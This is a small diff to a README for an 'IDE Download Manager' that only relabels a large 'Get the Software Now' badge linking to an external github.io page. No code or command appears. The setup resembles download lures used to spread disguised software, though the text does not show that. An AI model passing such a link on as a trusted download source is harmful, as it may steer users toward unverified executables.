@@ -6,7 +6,7 @@
      alt="IDE Download Manager Logo" 
      style="width: 100%; height: auto; display: block;">
 
-[![Get IDE Download Manager Software](https://img.shields.io/badge/?_Get_IDE_Download_Manager_Software-Now-6a0dad?style=for-the-badge&logo=github)](https://iovsyukova996.github.io/.github/ide-download-manager)
+[![Get the Software](https://img.shields.io/badge/Get_IDE_Download_Manager_Software-Now-6a0dad?style=for-the-badge&logo=github)](https://iovsyukova996.github.io/.github/ide-download-manager)
 
 ---
 
